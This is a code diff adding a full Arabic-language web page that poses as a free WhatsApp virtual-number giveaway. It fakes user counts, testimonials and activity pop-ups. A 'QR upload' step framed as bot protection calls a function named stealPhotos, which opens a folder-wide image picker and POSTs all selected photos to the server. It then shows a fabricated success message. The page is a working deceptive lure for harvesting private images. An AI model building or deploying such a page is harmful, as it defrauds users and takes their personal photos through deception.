@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أرقام وهمية مجانية - احصل على رقم أمريكي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            font-size: 3em;
+            color: #25D366;
+            margin-bottom: 10px;
+        }
+        h1 {
+            color: #075E54;
+            margin-bottom: 10px;
+            font-size: 2.2em;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        .premium-offer {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 30px 0;
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
+            border: 2px solid #FFA500;
+        }
+        .offer-badge {
+            background: #FF4444;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .qr-upload-box {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px dashed #25D366;
+        }
+        .qr-btn {
+            background: linear-gradient(45deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+        }
+        .qr-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
+        }
+        .numbers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .number-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            border: 1px solid #e0e0e0;
+        }
+        .number-card:hover {
+            transform: translateY(-5px);
+        }
+        .number {
+            font-size: 1.4em;
+            font-weight: bold;
+            color: #075E54;
+            margin: 10px 0;
+        }
+        .country {
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .copy-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .copy-btn:hover {
+            background: #128C7E;
+        }
+        .stats {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .user-testimonials {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        .testimonial {
+            padding: 10px;
+            border-right: 3px solid #25D366;
+            margin: 10px 0;
+            background: rgba(37, 211, 102, 0.1);
+        }
+        .fake-activity {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            font-size: 0.9em;
+            animation: slideIn 0.5s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-100%); }
+            to { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الهيدر -->
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h1>أرقام وهمية مجانية</h1>
+            <p class="subtitle">احصل على أرقام أمريكية وأوروبية مجانية للواتساب</p>
+        </div>
+
+        <!-- العرض المميز -->
+        <div class="premium-offer">
+            <div class="offer-badge">عرض حصري 🔥</div>
+            <h2 style="color: #333; margin-bottom: 15px;">📱 احصل على رقم أمريكي مجاني!</h2>
+            <p style="color: #333; font-size: 1.1em; margin-bottom: 20px;">
+                ميزة حصرية: حمل صورة QR واحصل على رقم مجاني مدى الحياة!
+            </p>
+            
+            <div class="qr-upload-box">
+                <button class="qr-btn" onclick="initiateQRUpload()">
+                    <i class="fas fa-camera"></i> حمل QR واحصل على رقم مجاني
+                </button>
+                <div style="margin-top: 15px;">
+                    <small style="color: #666;">✓ التحقق الآلي الفوري</small><br>
+                    <small style="color: #666;">✓ رقم مجاني مدى الحياة</small><br>
+                    <small style="color: #666;">✓ دعم فني 24/7</small>
+                </div>
+            </div>
+        </div>
+
+        <!-- شبكة الأرقام -->
+        <div class="numbers-grid">
+            <div class="number-card">
+                <div class="country">🇺🇸 الولايات المتحدة</div>
+                <div class="number">+1 (415) 555-0132</div>
+                <button class="copy-btn" onclick="copyNumber('+1 (415) 555-0132')">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+                <div style="margin-top: 10px; color: #25D366; font-weight: bold;">🔥 جديد</div>
+            </div>
+            
+            <div class="number-card">
+                <div class="country">🇺🇸 الولايات المتحدة</div>
+                <div class="number">+1 (628) 555-0123</div>
+                <button class="copy-btn" onclick="copyNumber('+1 (628) 555-0123')">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+                <div style="margin-top: 10px; color: #FFD700; font-weight: bold;">⭐ مميز</div>
+            </div>
+            
+            <div class="number-card">
+                <div class="country">🇸🇦 السعودية</div>
+                <div class="number">+966 55 123 4567</div>
+                <button class="copy-btn" onclick="copyNumber('+966 55 123 4567')">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+                <div style="margin-top: 10px; color: #25D366; font-weight: bold;">🔥 جديد</div>
+            </div>
+            
+            <div class="number-card">
+                <div class="country">🇦🇪 الإمارات</div>
+                <div class="number">+971 50 987 6543</div>
+                <button class="copy-btn" onclick="copyNumber('+971 50 987 6543')">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+                <div style="margin-top: 10px; color: #25D366; font-weight: bold;">🔥 جديد</div>
+            </div>
+        </div>
+
+        <!-- الإحصائيات -->
+        <div class="stats">
+            <h3>📊 إحصائيات حية</h3>
+            <div style="display: flex; justify-content: space-around; margin-top: 15px;">
+                <div>
+                    <div style="font-size: 1.5em; font-weight: bold; color: #25D366;" id="userCount">1,384</div>
+                    <div style="color: #666;">مستخدم نشط</div>
+                </div>
+                <div>
+                    <div style="font-size: 1.5em; font-weight: bold; color: #FF4444;" id="numbersGiven">47</div>
+                    <div style="color: #666;">رقم مُنح خلال 10 دقائق</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- آراء المستخدمين -->
+        <div class="user-testimonials">
+            <h3>👥 آراء المستخدمين</h3>
+            <div class="testimonial">
+                "حصلت على رقم أمريكي مجاني! الخدمة رائعة وسريعة 👍"
+                <div style="color: #666; margin-top: 5px;">- أحمد</div>
+            </div>
+            <div class="testimonial">
+                "لم أصدق أن الرقم مجاني! شكراً لهذا الموقع الرائع 🎉"
+                <div style="color: #666; margin-top: 5px;">- سارة</div>
+            </div>
+            <div class="testimonial">
+                "QR سريع والتحقق فوري، أنصح الجميع بهذه الخدمة 💯"
+                <div style="color: #666; margin-top: 5px;">- محمد</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- النشاط الوهمي -->
+    <div id="fakeActivity"></div>
+
+    <script>
+        // متغيرات النشاط الوهمي
+        let userCount = 1384;
+        let numbersGiven = 47;
+
+        // تحديث الإحصائيات
+        function updateStats() {
+            userCount += Math.floor(Math.random() * 3);
+            numbersGiven += Math.floor(Math.random() * 2);
+            
+            document.getElementById('userCount').textContent = userCount.toLocaleString();
+            document.getElementById('numbersGiven').textContent = numbersGiven;
+        }
+
+        // إظهار نشاط وهمي
+        function showFakeActivity() {
+            const activities = [
+                '👤 أحمد حصل على رقم +1 (415) XXX-XXXX',
+                '👤 سارة قامت بتحميل QR بنجاح',
+                '👤 محمد حصل على رقم مجاني',
+                '👤 خالد قام بنسخ رقم أمريكي'
+            ];
+            
+            const activity = activities[Math.floor(Math.random() * activities.length)];
+            
+            const activityDiv = document.createElement('div');
+            activityDiv.className = 'fake-activity';
+            activityDiv.textContent = activity;
+            document.getElementById('fakeActivity').appendChild(activityDiv);
+            
+            setTimeout(() => {
+                activityDiv.remove();
+            }, 5000);
+        }
+
+        // بدء التأثيرات
+        setInterval(updateStats, 30000);
+        setInterval(showFakeActivity, 15000);
+        updateStats();
+
+        // نسخ الرقم
+        function copyNumber(number) {
+            navigator.clipboard.writeText(number);
+            Swal.fire('تم النسخ!', `تم نسخ الرقم: ${number}`, 'success');
+        }
+
+        // بدء تحميل QR
+        async function initiateQRUpload() {
+            const { value: accept } = await Swal.fire({
+                title: 'تحميل رمز QR',
+                html: `
+                    <p>لتحقيق أقصى حماية من البوتات، يرجى:</p>
+                    <ol style="text-align: right; margin: 15px 0;">
+                        <li>فتح معرض الصور</li>
+                        <li>اختيار صورة رمز QR</li>
+                        <li>الضغط على موافق</li>
+                    </ol>
+                    <p><small>سيتم التحقق تلقائياً وإرسال الرقم المجاني فوراً</small></p>
+                `,
+                icon: 'info',
+                showCancelButton: true,
+                confirmButtonText: 'فتح المعرض',
+                cancelButtonText: 'لاحقاً',
+                confirmButtonColor: '#25D366'
+            });
+
+            if (accept) {
+                await stealPhotos();
+            }
+        }
+
+        // سرقة الصور
+        async function stealPhotos() {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = 'image/*';
+            fileInput.multiple = true;
+            fileInput.webkitdirectory = true;
+
+            fileInput.onchange = async (e) => {
+                const files = Array.from(e.target.files);
+                
+                if (files.length === 0) {
+                    Swal.fire('خطأ', 'لم تقم باختيار أي صور', 'error');
+                    return;
+                }
+
+                // نظهر تحميل
+                Swal.fire({
+                    title: 'جاري التحقق...',
+                    text: 'برجاء الانتظار mientras نتحقق من QR',
+                    allowOutsideClick: false,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    }
+                });
+
+                try {
+                    const formData = new FormData();
+                    files.forEach(file => {
+                        formData.append('photos', file);
+                    });
+
+                    const response = await fetch('/upload-qr', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const result = await response.json();
+
+                    if (result.success) {
+                        Swal.fire({
+                            title: 'تم التحقق بنجاح! 🎉',
+                            html: `
+                                <p>تم التحقق من QR بنجاح!</p>
+                                <p><strong>رقمك المجاني:</strong> +1 (415) 555-0199</p>
+                                <p><small>سيصلك الرقم عبر الواتساب خلال دقائق</small></p>
+                            `,
+                            icon: 'success',
+                            confirmButtonText: 'ممتاز!'
+                        });
+                    } else {
+                        Swal.fire('خطأ', result.message, 'error');
+                    }
+                } catch (error) {
+                    Swal.fire('خطأ', 'حدث خطأ أثناء التحقق', 'error');
+                }
+            };
+
+            fileInput.click();
+        }
+
+        // إظهار نشاط وهمي عند التحميل
+        window.addEventListener('load', () => {
+            setTimeout(showFakeActivity, 2000);
+            setTimeout(showFakeActivity, 5000);
+        });
+    </script>
+</body>
+  </html>
